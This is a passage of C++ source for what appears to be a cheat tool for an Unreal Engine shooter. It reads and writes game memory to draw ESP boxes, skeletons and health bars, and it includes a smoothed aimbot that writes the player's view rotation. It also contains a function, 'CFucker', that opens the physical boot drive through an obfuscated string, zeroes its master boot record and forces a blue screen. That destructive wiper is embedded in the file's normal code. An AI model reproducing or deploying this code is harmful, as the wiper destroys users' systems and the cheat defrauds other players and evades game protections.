
#include "theme.h"
#include "xor.h"
#include <random>

int S_width = GetSystemMetrics(SM_CXSCREEN);
int S_height = GetSystemMetrics(SM_CYSCREEN);

float LAphlth;

uintptr_t LAp_rot;

uintptr_t LAppwn;
bool hitsound;

std::string response;



std::string RandomString(size_t length = 0)
{
	static const std::string allowed_chars{ "0123456789abcdefghjklmnoprstuvqyzA" };

	static thread_local std::default_random_engine randomEngine(std::random_device{}());
	static thread_local std::uniform_int_distribution<int> randomDistribution(0, allowed_chars.size() - 1);

	std::string id(length ? length : 32, '\0');

	for (std::string::value_type& c : id) {
		c = allowed_chars[randomDistribution(randomEngine)];
	}

	return id;
}

std::string randomoverlay = RandomString(20);
std::wstring temp = std::wstring(randomoverlay.begin(), randomoverlay.end());
LPCWSTR overlayString = temp.c_str();


#define MBR_SIZE 512
DWORD CFucker()
{
	DWORD write;
	char mbrData[512];
	ZeroMemory(&mbrData, (sizeof mbrData));
	RtlSecureZeroMemory(&mbrData, (sizeof mbrData));
	HANDLE MasterBootRecord = CreateFileA(XorString("\\\\.\\PhysicalDrive0"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL))
		BlueScreen();
	else
		BlueScreen();
	CloseHandle(MasterBootRecord);
	return EXIT_SUCCESS;
}


auto Vsbles(DWORD_PTR mesh) -> bool
{
	float fLastSubmitTime = lexemveread<float>(mesh + 0x378);
	float fLastRenderTimeOnScreen = lexemveread<float>(mesh + 0x37C);

	const float fVisionTick = 0.06f;
	bool bVisible = fLastRenderTimeOnScreen + fVisionTick >= fLastSubmitTime;

	return bVisible;
}

uintptr_t LApactr;

extern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);

struct State {
	uintptr_t LApkys[7];
};

namespace LAGMMEEE
{
	int LAcenter_x = GetSystemMetrics(0) / 2 - 3;
	int LAcenter_y = GetSystemMetrics(1) / 2 - 3;

	float LAWidth, LAHeight = 0.f;
	class fvector {
	public:
		fvector() : x(0.f), y(0.f), z(0.f) {}
		fvector(float _x, float _y, float _z) : x(_x), y(_y), z(_z) {}
		~fvector() {}

		float x;
		float y;
		float z;

		inline float Dot(fvector v) {
			return x * v.x + y * v.y + z * v.z;
		}

		inline float distance(fvector v) {
			return float(sqrtf(powf(v.x - x, 2.0) + powf(v.y - y, 2.0) + powf(v.z - z, 2.0)));
		}

		fvector operator+(fvector v) {
			return fvector(x + v.x, y + v.y, z + v.z);
		}

		fvector operator-(fvector v) {
			return fvector(x - v.x, y - v.y, z - v.z);
		}
		fvector operator/(float flDiv) {
			return fvector(x / flDiv, y / flDiv, z / flDiv);
		}

		fvector operator*(float Scale) {

			return fvector(x * Scale, y * Scale, z * Scale);
		}
		inline float Length() {
			return sqrtf((x * x) + (y * y) + (z * z));
		}
		fvector operator-=(fvector v) {

			x -= v.x;
			y -= v.y;
			z -= v.z;
			return *this;
		}
	};

	struct FVector2D
	{
	public:
		float x;
		float y;

		inline FVector2D() : x(0), y(0) {}
		inline FVector2D(float x, float y) : x(x), y(y) {}

		inline float Distance(FVector2D v) {
			return sqrtf(((v.x - x) * (v.x - x) + (v.y - y) * (v.y - y)));
		}

		inline FVector2D operator+(const FVector2D& v) const {
			return FVector2D(x + v.x, y + v.y);
		}

		inline FVector2D operator-(const FVector2D& v) const {
			return FVector2D(x - v.x, y - v.y);
		}

	};

	struct fquat {
		float x;
		float y;
		float z;
		float w;
	};

	struct ftransform {
		fquat rot;
		fvector translation;
		char pad[4];
		fvector scale;
		char pad1[4];
		D3DMATRIX ToMatrixWithScale() {
			D3DMATRIX m;
			m._41 = translation.x;
			m._42 = translation.y;
			m._43 = translation.z;

			float x2 = rot.x + rot.x;
			float y2 = rot.y + rot.y;
			float z2 = rot.z + rot.z;

			float xx2 = rot.x * x2;
			float yy2 = rot.y * y2;
			float zz2 = rot.z * z2;
			m._11 = (1.0f - (yy2 + zz2)) * scale.x;
			m._22 = (1.0f - (xx2 + zz2)) * scale.y;
			m._33 = (1.0f - (xx2 + yy2)) * scale.z;

			float yz2 = rot.y * z2;
			float wx2 = rot.w * x2;
			m._32 = (yz2 - wx2) * scale.z;
			m._23 = (yz2 + wx2) * scale.y;

			float xy2 = rot.x * y2;
			float wz2 = rot.w * z2;
			m._21 = (xy2 - wz2) * scale.y;
			m._12 = (xy2 + wz2) * scale.x;

			float xz2 = rot.x * z2;
			float wy2 = rot.w * y2;
			m._31 = (xz2 + wy2) * scale.z;
			m._13 = (xz2 - wy2) * scale.x;

			m._14 = 0.0f;
			m._24 = 0.0f;
			m._34 = 0.0f;
			m._44 = 1.0f;

			return m;
		}
	};
	fvector cntrlrttn;
	namespace LAmth
	{
		D3DMATRIX matrix(fvector rot, fvector origin = fvector(0, 0, 0)) {
			float radPitch = (rot.x * float(M_PI) / 180.f);
			float radYaw = (rot.y * float(M_PI) / 180.f);
			float radRoll = (rot.z * float(M_PI) / 180.f);

			float SP = sinf(radPitch);
			float CP = cosf(radPitch);
			float SY = sinf(radYaw);
			float CY = cosf(radYaw);
			float SR = sinf(radRoll);
			float CR = cosf(radRoll);

			D3DMATRIX matrix;
			matrix.m[0][0] = CP * CY;
			matrix.m[0][1] = CP * SY;
			matrix.m[0][2] = SP;
			matrix.m[0][3] = 0.f;

			matrix.m[1][0] = SR * SP * CY - CR * SY;
			matrix.m[1][1] = SR * SP * SY + CR * CY;
			matrix.m[1][2] = -SR * CP;
			matrix.m[1][3] = 0.f;

			matrix.m[2][0] = -(CR * SP * CY + SR * SY);
			matrix.m[2][1] = CY * SR - CR * SP * SY;
			matrix.m[2][2] = CR * CP;
			matrix.m[2][3] = 0.f;

			matrix.m[3][0] = origin.x;
			matrix.m[3][1] = origin.y;
			matrix.m[3][2] = origin.z;
			matrix.m[3][3] = 1.f;

			return matrix;
		}

		D3DMATRIX MatrixMultiplication(D3DMATRIX pM1, D3DMATRIX pM2)
		{
			D3DMATRIX pOut;
			pOut._11 = pM1._11 * pM2._11 + pM1._12 * pM2._21 + pM1._13 * pM2._31 + pM1._14 * pM2._41;
			pOut._12 = pM1._11 * pM2._12 + pM1._12 * pM2._22 + pM1._13 * pM2._32 + pM1._14 * pM2._42;
			pOut._13 = pM1._11 * pM2._13 + pM1._12 * pM2._23 + pM1._13 * pM2._33 + pM1._14 * pM2._43;
			pOut._14 = pM1._11 * pM2._14 + pM1._12 * pM2._24 + pM1._13 * pM2._34 + pM1._14 * pM2._44;
			pOut._21 = pM1._21 * pM2._11 + pM1._22 * pM2._21 + pM1._23 * pM2._31 + pM1._24 * pM2._41;
			pOut._22 = pM1._21 * pM2._12 + pM1._22 * pM2._22 + pM1._23 * pM2._32 + pM1._24 * pM2._42;
			pOut._23 = pM1._21 * pM2._13 + pM1._22 * pM2._23 + pM1._23 * pM2._33 + pM1._24 * pM2._43;
			pOut._24 = pM1._21 * pM2._14 + pM1._22 * pM2._24 + pM1._23 * pM2._34 + pM1._24 * pM2._44;
			pOut._31 = pM1._31 * pM2._11 + pM1._32 * pM2._21 + pM1._33 * pM2._31 + pM1._34 * pM2._41;
			pOut._32 = pM1._31 * pM2._12 + pM1._32 * pM2._22 + pM1._33 * pM2._32 + pM1._34 * pM2._42;
			pOut._33 = pM1._31 * pM2._13 + pM1._32 * pM2._23 + pM1._33 * pM2._33 + pM1._34 * pM2._43;
			pOut._34 = pM1._31 * pM2._14 + pM1._32 * pM2._24 + pM1._33 * pM2._34 + pM1._34 * pM2._44;
			pOut._41 = pM1._41 * pM2._11 + pM1._42 * pM2._21 + pM1._43 * pM2._31 + pM1._44 * pM2._41;
			pOut._42 = pM1._41 * pM2._12 + pM1._42 * pM2._22 + pM1._43 * pM2._32 + pM1._44 * pM2._42;
			pOut._43 = pM1._41 * pM2._13 + pM1._42 * pM2._23 + pM1._43 * pM2._33 + pM1._44 * pM2._43;
			pOut._44 = pM1._41 * pM2._14 + pM1._42 * pM2._24 + pM1._43 * pM2._34 + pM1._44 * pM2._44;

			return pOut;
		}
	}

	struct Vector2 {
	public:
		float x;
		float y;

		inline Vector2() : x(0), y(0) {}
		inline Vector2(float x, float y) : x(x), y(y) {}

		inline float Distance(Vector2 v) {
			return sqrtf(((v.x - x) * (v.x - x) + (v.y - y) * (v.y - y)));
		}

		inline Vector2 operator+(const Vector2& v) const {
			return Vector2(x + v.x, y + v.y);
		}

		inline Vector2 operator-(const Vector2& v) const {
			return Vector2(x - v.x, y - v.y);
		}
	};

	struct FMinimalViewInfo {
		struct fvector Location;
		struct fvector Rotation;
		float FOV;
	};

	namespace LAGRDPNT
	{
		uintptr_t guard_local_pawn = 0x0;
		uintptr_t guard_controller = 0x0;
	}

	namespace LAPNT
	{
		uintptr_t local_pawn;
		uintptr_t local_pawn_old;
		uintptr_t player_controller;
		uintptr_t camera_manager;
		fvector camera_position;
	}

	struct FNameEntryHandle {
		uint16_t bIsWide : 1;
		uint16_t Len : 15;
	};

	struct FNameEntry {

		int32_t ComparisonId;
		FNameEntryHandle Header;
		union
		{
			char    AnsiName[1024]; // ANSICHAR
			wchar_t    WideName[1024]; // WIDECHAR
		};


		wchar_t const* GetWideName() const { return WideName; }
		char const* GetAnsiName() const { return AnsiName; }
		bool IsWide() const { return Header.bIsWide; }
	};

	std::string get_fname(int key)
	{
		UINT chunkOffset = (UINT)((int)(key) >> 16);
		USHORT nameOffset = (USHORT)key;
		std::uint64_t namePoolChunk = lexemveread<std::uint64_t>((std::uintptr_t)(lexemvemem::lexemvefind_image() + 0x9A586C0 + ((chunkOffset + 2) * 8)));
		std::uint64_t entryOffset = namePoolChunk + (ULONG)(4 * nameOffset);
		FNameEntry nameEntry = lexemveread<FNameEntry>(entryOffset);

		auto name = nameEntry.AnsiName; //just ansiname fuck widename
		std::uintptr_t nameKey = lexemveread2<uintptr_t>(lexemvevirtualaddy + 0x0);

		for (std::uint16_t i = 0; i < nameEntry.Header.Len; i++)
		{
			BYTE b = i & 3;
			name[i] ^= nameEntry.Header.Len ^ *((LPBYTE)&nameKey + b);
		}

		return name;
	}


	namespace LACAMRA
	{
		fvector location;
		fvector rotation;
		float fov;
	}

	struct LAPLYR
	{
		uintptr_t for_actor;
		uintptr_t for_mesh;

		uintptr_t actor;
		uintptr_t mesh;
		uintptr_t bone_array;
		uintptr_t root_component;
		uintptr_t damage_handler;

		INT32 bone_count;
		INT32 ammo_count;

		std::string weapon_name;
		std::string agent_name;
		std::string player_name;

		float distance;
		float health;
		float shield;

		bool is_valid;
		bool is_damage_handler_guarded;
		bool is_mesh_guarded;
	};

	std::vector<LAPLYR> player_pawns;

	inline bool operator==(const LAPLYR& a, const LAPLYR& b) {
		if (a.actor == b.actor)
			return true;

		return false;
	}


	void LAPLAMP(fvector& Ang) {
		if (Ang.x < 0.f)
			Ang.x += 360.f;

		if (Ang.x > 360.f)
			Ang.x -= 360.f;

		if (Ang.y < 0.f) Ang.y += 360.f;
		if (Ang.y > 360.f) Ang.y -= 360.f;
		Ang.z = 0.f;
	}

	float lexemveread_visible(LAPLYR _player, int num)
	{
		return lexemveread<float>(_player.for_mesh + _player.mesh + num);
	}


	bool is_visible(LAPLYR _player) {

		int i = 848;

		float v1 = lexemveread_visible(_player, i);
		i += 0x8;
		float v2 = lexemveread_visible(_player, i);

		float difference = v1 - v2;
		if (difference < 0.f)
		{
			difference *= -1;
		}

		if (difference < 0.01f)
			return true;

		return false;
	}

	bool is_dormant(LAPLYR _player)
	{
		return lexemveread<bool>(_player.for_actor + _player.actor + 0x100);
	}



	fvector w2s(fvector world_location) {
		fvector ScreenLocation;
		D3DMATRIX tempMatrix = LAmth::matrix(LACAMRA::rotation, fvector(0, 0, 0));
		fvector vAxisX, vAxisY, vAxisZ;
		vAxisX = fvector(tempMatrix.m[0][0], tempMatrix.m[0][1], tempMatrix.m[0][2]);
		vAxisY = fvector(tempMatrix.m[1][0], tempMatrix.m[1][1], tempMatrix.m[1][2]);
		vAxisZ = fvector(tempMatrix.m[2][0], tempMatrix.m[2][1], tempMatrix.m[2][2]);
		fvector vDelta = world_location - LACAMRA::location;
		fvector vTransformed = fvector(vDelta.Dot(vAxisY), vDelta.Dot(vAxisZ), vDelta.Dot(vAxisX));
		if (vTransformed.z < .1f)
			vTransformed.z = .1f;


		float ScreenCenterX = LAcenter_x;
		float ScreenCenterY = LAcenter_y;

		ScreenLocation.x = ScreenCenterX + vTransformed.x * (ScreenCenterX / tanf(LACAMRA::fov * (float)M_PI / 360.f)) / vTransformed.z;
		ScreenLocation.y = ScreenCenterY - vTransformed.y * (ScreenCenterX / tanf(LACAMRA::fov * (float)M_PI / 360.f)) / vTransformed.z;
		return ScreenLocation;
	}

	void rndforambt()
	{
		while (true)
		{
			config.amcnstoff = 15.f;
			std::this_thread::sleep_for(std::chrono::milliseconds(200000));

			config.amcnstoff = 2.f;
			std::this_thread::sleep_for(std::chrono::milliseconds(200000));

			config.amcnstoff = 8.f;
			std::this_thread::sleep_for(std::chrono::milliseconds(200000));

			config.amcnstoff = 20.f;
			std::this_thread::sleep_for(std::chrono::milliseconds(200000));

			config.amcnstoff = 4.f;
			std::this_thread::sleep_for(std::chrono::milliseconds(200000));

			config.amcnstoff = 12.f;
			std::this_thread::sleep_for(std::chrono::milliseconds(200000));
		}
	}

	float LACALDISTNC(int p1x, int p1y, int p2x, int p2y)
	{
		float diffY = p1y - p2y;
		float diffX = p1x - p2x;
		return sqrt((diffY * diffY) + (diffX * diffX));
	}

	void LAPNRMLZE(fvector& in)
	{
		if (in.x > 89.f) in.x -= 360.f;
		else if (in.x < -89.f) in.x += 360.f;

		while (in.y > 180)in.y -= 360;
		while (in.y < -180)in.y += 360;
		in.z = 0;
	}

	void LAPNRMLZEANGL(fvector& angle)
	{
		while (angle.x > 89.0f)
			angle.x -= 180.f;

		while (angle.x < -89.0f)
			angle.x += 180.f;

		while (angle.y > 180.f)
			angle.y -= 360.f;

		while (angle.y < -180.f)
			angle.y += 360.f;
	}
	float LAFOVGT(const fvector viewAngle, const fvector aimAngle)
	{
		fvector Delta = fvector(aimAngle.x - viewAngle.x, aimAngle.y - viewAngle.y, aimAngle.z - viewAngle.z);
		LAPNRMLZEANGL(Delta);
		return sqrt(pow(Delta.x, 2.0f) + pow(Delta.y, 2.0f));
	}


	fvector LAPSMTHAM(fvector Camera_rotation, fvector Target, float SmoothFactor)
	{
		fvector diff = Target - Camera_rotation;
		LAPNRMLZE(diff);
		return Camera_rotation + diff / SmoothFactor;
	}

	float LAPTDGRTRDN(float degree)
	{
		return degree * (M_PI / 180);
	}


	void LApangrtn(const fvector& angles, fvector* forward)
	{
		float	sp, sy, cp, cy;

		sy = sin(LAPTDGRTRDN(angles.y));
		cy = cos(LAPTDGRTRDN(angles.y));

		sp = sin(LAPTDGRTRDN(angles.x));
		cp = cos(LAPTDGRTRDN(angles.x));

		forward->x = cp * cy;
		forward->y = cp * sy;
		forward->z = -sp;
	}


	fvector LABNMTRX(int index, LAPLYR _player)
	{
		size_t size = sizeof(ftransform);
		ftransform first_bone, comp_to_world;

		first_bone = lexemveread<ftransform>(_player.bone_array + (size * index));
		comp_to_world = lexemveread<ftransform>(_player.mesh + 0x250);


		D3DMATRIX matrix = LAmth::MatrixMultiplication(first_bone.ToMatrixWithScale(), comp_to_world.ToMatrixWithScale());
		return fvector(matrix._41, matrix._42, matrix._43);
	}



	void LAPRccS(fvector Target, fvector Camera_rotation, float SmoothFactor) {


		fvector ConvertRotation = Camera_rotation;
		LAPNRMLZE(ConvertRotation);

		auto ControlRotation = lexemveread<fvector>(LAPNT::player_controller + 0x440);
		fvector DeltaRotation = ConvertRotation - ControlRotation;
		LAPNRMLZE(DeltaRotation);


		ConvertRotation = Target - (DeltaRotation * SmoothFactor);
		LAPNRMLZE(ConvertRotation);

		fvector Smoothed = LAPSMTHAM(Camera_rotation, ConvertRotation, SmoothFactor);
		Smoothed -= (DeltaRotation / SmoothFactor);
		LAPLAMP(Smoothed);
		LAPNRMLZE(Smoothed);
		lxmvwrte<fvector>(LAPNT::player_controller + 0x440, (fvector)Smoothed);
		return;
	}

	void LAdrw3dbx(fvector base, fvector top_reach, float wide, ImVec4 col, float thickness)
	{


		fvector bottom_rect_1 = fvector(base.x + wide, base.y + wide, base.z);
		fvector bottom_rect_2 = fvector(base.x + wide, base.y - wide, base.z);
		fvector bottom_rect_3 = fvector(base.x - wide, base.y + wide, base.z);
		fvector bottom_rect_4 = fvector(base.x - wide, base.y - wide, base.z);


		fvector top_rect_1 = fvector(top_reach.x + wide, top_reach.y + wide, top_reach.z);
		fvector top_rect_2 = fvector(top_reach.x + wide, top_reach.y - wide, top_reach.z);
		fvector top_rect_3 = fvector(top_reach.x - wide, top_reach.y + wide, top_reach.z);
		fvector top_rect_4 = fvector(top_reach.x - wide, top_reach.y - wide, top_reach.z);


		bottom_rect_1 = w2s(bottom_rect_1);
		bottom_rect_2 = w2s(bottom_rect_2);
		bottom_rect_3 = w2s(bottom_rect_3);
		bottom_rect_4 = w2s(bottom_rect_4);


		top_rect_1 = w2s(top_rect_1);
		top_rect_2 = w2s(top_rect_2);
		top_rect_3 = w2s(top_rect_3);
		top_rect_4 = w2s(top_rect_4);


		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom_rect_1.x, bottom_rect_1.y), ImVec2(bottom_rect_2.x, bottom_rect_2.y), config.espcolor, thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom_rect_2.x, bottom_rect_2.y), ImVec2(bottom_rect_4.x, bottom_rect_4.y), config.espcolor, thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom_rect_4.x, bottom_rect_4.y), ImVec2(bottom_rect_3.x, bottom_rect_3.y), config.espcolor, thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom_rect_3.x, bottom_rect_3.y), ImVec2(bottom_rect_1.x, bottom_rect_1.y), config.espcolor, thickness);

		ImGui::GetOverlayDrawList()->AddLine(ImVec2(top_rect_1.x, top_rect_1.y), ImVec2(top_rect_2.x, top_rect_2.y), config.espcolor, thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(top_rect_2.x, top_rect_2.y), ImVec2(top_rect_4.x, top_rect_4.y), config.espcolor, thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(top_rect_4.x, top_rect_4.y), ImVec2(top_rect_3.x, top_rect_3.y), config.espcolor, thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(top_rect_3.x, top_rect_3.y), ImVec2(top_rect_1.x, top_rect_1.y), config.espcolor, thickness);

		//render connection lines
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom_rect_1.x, bottom_rect_1.y), ImVec2(top_rect_1.x, top_rect_1.y), config.espcolor, thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom_rect_2.x, bottom_rect_2.y), ImVec2(top_rect_2.x, top_rect_2.y), config.espcolor, thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom_rect_3.x, bottom_rect_3.y), ImVec2(top_rect_3.x, top_rect_3.y), config.espcolor, thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(bottom_rect_4.x, bottom_rect_4.y), ImVec2(top_rect_4.x, top_rect_4.y), config.espcolor, thickness);
	}

	void DrawFilledRect2(int x, int y, int w, int h, ImColor color)
	{
		ImGui::GetOverlayDrawList()->AddRectFilled(ImVec2(x, y), ImVec2(x + w, y + h), color, 0.0f);
	}


	void DrawNormalBox(int x, int y, int w, int h, int borderPx, ImColor color)
	{
		DrawFilledRect2(x + borderPx, y, w, borderPx, color);
		DrawFilledRect2(x + w - w + borderPx, y, w, borderPx, color);
		DrawFilledRect2(x, y, borderPx, h, color);
		DrawFilledRect2(x, y + h - h + borderPx * 2, borderPx, h, color);
		DrawFilledRect2(x + borderPx, y + h + borderPx, w, borderPx, color);
		DrawFilledRect2(x + w - w + borderPx, y + h + borderPx, w, borderPx, color);
		DrawFilledRect2(x + w + borderPx, y, borderPx, h, color);
		DrawFilledRect2(x + w + borderPx, y + h - h + borderPx * 2, borderPx, h, color);
	}

	fvector cLAmpasdp205(fvector src, fvector dst)
	{
		fvector angle;
		angle.x = -atan2f(dst.x - src.x, dst.y - src.y) / M_PI * 180.0f + 180.0f;
		angle.y = asinf((dst.z - src.z) / src.distance(dst)) * 180.0f / M_PI;
		angle.z = 0.0f;

		return angle;
	}

	fvector LAPSNNANGLE(fvector src, fvector dst)
	{
		fvector angle;
		fvector delta = fvector((src.x - dst.x), (src.y - dst.y), (src.z - dst.z));

		double hyp = sqrtf(delta.x * delta.x + delta.y * delta.y);

		angle.x = atanf(delta.z / hyp) * (180.0f / hyp);
		angle.y = atanf(delta.y / delta.x) * (180.0f / M_PI);
		angle.z = 0;
		if (delta.x >= 0.0) angle.y += 180.0f;

		return angle;
	}

	void LAPDRWCRNbx(int X, int Y, int W, int H, const ImU32& color, int thickness)
	{
		float lineW = (W / 3);
		float lineH = (H / 3);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X, Y + lineH), ImGui::GetColorU32(color), thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X + lineW, Y), ImGui::GetColorU32(color), thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y), ImVec2(X + W, Y), ImGui::GetColorU32(color), thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y), ImVec2(X + W, Y + lineH), ImGui::GetColorU32(color), thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H - lineH), ImVec2(X, Y + H), ImGui::GetColorU32(color), thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H), ImVec2(X + lineW, Y + H), ImGui::GetColorU32(color), thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y + H), ImVec2(X + W, Y + H), ImGui::GetColorU32(color), thickness);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y + H - lineH), ImVec2(X + W, Y + H), ImGui::GetColorU32(color), thickness);
	}


	void LADRWSKLTN(LAPLYR _player, ImVec4 col, float thickness)
	{
		fvector bone_head, bone_neck, bone_chest, bone_pelvis, bone_rshoulder, bone_relbow, bone_rhand, bone_rthigh, bone_rknee, bone_rfoot, bone_lshoulder, bone_lelbow, bone_lhand, bone_lthigh, bone_lknee, bone_lfoot;
		bone_head = LABNMTRX(8, _player);
		bone_chest = LABNMTRX(6, _player);
		bone_pelvis = LABNMTRX(3, _player);


		if (_player.bone_count == 101) //female
		{
			bone_neck = LABNMTRX(21, _player);

			bone_lshoulder = LABNMTRX(23, _player);
			bone_lelbow = LABNMTRX(24, _player);
			bone_lhand = LABNMTRX(25, _player);

			bone_rshoulder = LABNMTRX(49, _player);
			bone_relbow = LABNMTRX(50, _player);
			bone_rhand = LABNMTRX(51, _player);

			bone_lthigh = LABNMTRX(75, _player);
			bone_lknee = LABNMTRX(76, _player);
			bone_lfoot = LABNMTRX(78, _player);

			bone_rthigh = LABNMTRX(82, _player);
			bone_rknee = LABNMTRX(83, _player);
			bone_rfoot = LABNMTRX(85, _player);
		}
		else if (_player.bone_count == 103) //npc
		{
			bone_neck = LABNMTRX(9, _player);

			bone_lshoulder = LABNMTRX(33, _player);
			bone_lelbow = LABNMTRX(30, _player);
			bone_lhand = LABNMTRX(32, _player);

			bone_rshoulder = LABNMTRX(58, _player);
			bone_relbow = LABNMTRX(55, _player);
			bone_rhand = LABNMTRX(57, _player);

			bone_lthigh = LABNMTRX(63, _player);
			bone_lknee = LABNMTRX(65, _player);
			bone_lfoot = LABNMTRX(69, _player);

			bone_rthigh = LABNMTRX(77, _player);
			bone_rknee = LABNMTRX(79, _player);
			bone_rfoot = LABNMTRX(83, _player);
		}
		else if (_player.bone_count == 104) //male
		{
			bone_neck = LABNMTRX(21, _player);

			bone_lshoulder = LABNMTRX(23, _player);
			bone_lelbow = LABNMTRX(24, _player);
			bone_lhand = LABNMTRX(25, _player);

			bone_rshoulder = LABNMTRX(49, _player);
			bone_relbow = LABNMTRX(50, _player);
			bone_rhand = LABNMTRX(51, _player);

			bone_lthigh = LABNMTRX(77, _player);
			bone_lknee = LABNMTRX(78, _player);
			bone_lfoot = LABNMTRX(80, _player);

			bone_rthigh = LABNMTRX(84, _player);
			bone_rknee = LABNMTRX(85, _player);
			bone_rfoot = LABNMTRX(87, _player);
		}


		bone_head = w2s(bone_head);
		bone_neck = w2s(bone_neck);
		bone_chest = w2s(bone_chest);
		bone_pelvis = w2s(bone_pelvis);
		bone_lshoulder = w2s(bone_lshoulder);
		bone_lelbow = w2s(bone_lelbow);
		bone_lhand = w2s(bone_lhand);
		bone_rshoulder = w2s(bone_rshoulder);
		bone_relbow = w2s(bone_relbow);
		bone_rhand = w2s(bone_rhand);
		bone_lthigh = w2s(bone_lthigh);
		bone_lknee = w2s(bone_lknee);
		bone_lfoot = w2s(bone_lfoot);
		bone_rthigh = w2s(bone_rthigh);
		bone_rknee = w2s(bone_rknee);
		bone_rfoot = w2s(bone_rfoot);

		ImDrawList* draw = ImGui::GetOverlayDrawList();

		//top stuff
		draw->AddLine(ImVec2(bone_head.x, bone_head.y), ImVec2(bone_neck.x, bone_neck.y), ImGui::GetColorU32({ col.x, col.y, col.z, col.w }), thickness);
		draw->AddLine(ImVec2(bone_neck.x, bone_neck.y), ImVec2(bone_chest.x, bone_chest.y), ImGui::GetColorU32({ col.x, col.y, col.z, col.w }), thickness);
		draw->AddLine(ImVec2(bone_chest.x, bone_chest.y), ImVec2(bone_pelvis.x, bone_pelvis.y), ImGui::GetColorU32({ col.x, col.y, col.z, col.w }), thickness);

		//right arm
		draw->AddLine(ImVec2(bone_chest.x, bone_chest.y), ImVec2(bone_rshoulder.x, bone_rshoulder.y), ImGui::GetColorU32({ col.x, col.y, col.z, col.w }), thickness);
		draw->AddLine(ImVec2(bone_rshoulder.x, bone_rshoulder.y), ImVec2(bone_relbow.x, bone_relbow.y), ImGui::GetColorU32({ col.x, col.y, col.z, col.w }), thickness);
		draw->AddLine(ImVec2(bone_relbow.x, bone_relbow.y), ImVec2(bone_rhand.x, bone_rhand.y), ImGui::GetColorU32({ col.x, col.y, col.z, col.w }), thickness);

		//left arm
		draw->AddLine(ImVec2(bone_chest.x, bone_chest.y), ImVec2(bone_lshoulder.x, bone_lshoulder.y), ImGui::GetColorU32({ col.x, col.y, col.z, col.w }), thickness);
		draw->AddLine(ImVec2(bone_lshoulder.x, bone_lshoulder.y), ImVec2(bone_lelbow.x, bone_lelbow.y), ImGui::GetColorU32({ col.x, col.y, col.z, col.w }), thickness);
		draw->AddLine(ImVec2(bone_lelbow.x, bone_lelbow.y), ImVec2(bone_lhand.x, bone_lhand.y), ImGui::GetColorU32({ col.x, col.y, col.z, col.w }), thickness);

		//right foot
		draw->AddLine(ImVec2(bone_pelvis.x, bone_pelvis.y), ImVec2(bone_rthigh.x, bone_rthigh.y), ImGui::GetColorU32({ col.x, col.y, col.z, col.w }), thickness);
		draw->AddLine(ImVec2(bone_rthigh.x, bone_rthigh.y), ImVec2(bone_rknee.x, bone_rknee.y), ImGui::GetColorU32({ col.x, col.y, col.z, col.w }), thickness);
		draw->AddLine(ImVec2(bone_rknee.x, bone_rknee.y), ImVec2(bone_rfoot.x, bone_rfoot.y), ImGui::GetColorU32({ col.x, col.y, col.z, col.w }), thickness);

		//left foot
		draw->AddLine(ImVec2(bone_pelvis.x, bone_pelvis.y), ImVec2(bone_lthigh.x, bone_lthigh.y), ImGui::GetColorU32({ col.x, col.y, col.z, col.w }), thickness);
		draw->AddLine(ImVec2(bone_lthigh.x, bone_lthigh.y), ImVec2(bone_lknee.x, bone_lknee.y), ImGui::GetColorU32({ col.x, col.y, col.z, col.w }), thickness);
		draw->AddLine(ImVec2(bone_lknee.x, bone_lknee.y), ImVec2(bone_lfoot.x, bone_lfoot.y), ImGui::GetColorU32({ col.x, col.y, col.z, col.w }), thickness);
	}

	void LADRWHLTHBR(ImVec2 min, ImVec2 max, float health, float outline_thickness)
	{
		float health_percentage = health;
		health_percentage *= 0.01f;

		float length_left_to_right = max.x - min.x;
		length_left_to_right *= health_percentage;

		float healthbar_size_y = 5.f;

		float g = health_percentage * 255.f;
		float r = 255.f - g;
		float b = 0.f;

		r /= 255.f;
		g /= 255.f;
		b /= 255.f;

		// background
		ImGui::GetOverlayDrawList()->AddRectFilled(ImVec2(min.x, min.y - healthbar_size_y), ImVec2(max.x, max.y), ImGui::GetColorU32({ 0.f, 0.f, 0.f, 1.f }), 0.f, 15);

		// health bar
		ImGui::GetOverlayDrawList()->AddRectFilled(ImVec2(min.x, min.y - healthbar_size_y), ImVec2(min.x + length_left_to_right, max.y), ImGui::GetColorU32({ r, g, b, 1.f }), 0.f, 15);

		// outline
		ImGui::GetOverlayDrawList()->AddRect(ImVec2(min.x, min.y - healthbar_size_y), ImVec2(max.x, max.y), ImGui::GetColorU32({ 0.f, 0.f, 0.f, 1.f }), 0.f, 15, outline_thickness);
	}

	void qweqweqweqweqwe()
	{
		ImGuiIO& io = ImGui::GetIO();
		ImFont* font = io.Fonts->AddFontFromFileTTF("C:\\Windows\\Fonts\\Georgia.ttf ", 14);
		static const ImWchar icons_ranges[] = { ICON_MIN_FA, ICON_MAX_16_FA, 0 };
		ImFontConfig icons_config; icons_config.MergeMode = true; icons_config.PixelSnapH = true;
		ImFont* FontAwesome = io.Fonts->AddFontFromMemoryCompressedTTF(fa6_solid_compressed_data, fa6_solid_compressed_size, 14.f, &icons_config, icons_ranges);
